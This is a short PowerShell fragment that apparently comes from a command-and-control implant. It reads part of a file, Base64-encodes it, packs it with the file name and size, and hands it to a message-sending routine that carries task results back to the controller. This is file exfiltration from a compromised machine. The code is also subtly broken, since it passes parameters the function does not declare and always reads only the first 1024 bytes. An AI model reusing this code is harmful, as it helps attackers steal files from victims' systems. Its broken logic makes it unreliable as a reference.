function Get-FilePart($File) {
    $stream = [IO.File]::OpenRead($File)
    $buff = New-Object byte[] 1024
    $null = $stream.Read($buff, 0, $buff.Length)
    [System.Convert]::ToBase64String($buff)
}
$EncodedPart = Get-FilePart -File "$file" -Index $Index -ChunkSize $ChunkSize
$filesize = (Get-Item $file).Length
$data = "{0}|{1}|{2}|{3}" -f $Index, $file, $filesize, $EncodedPart
(& $SendMessage -Packets $(Encode-Packet -type $type -data $($data) -ResultID $ResultID))
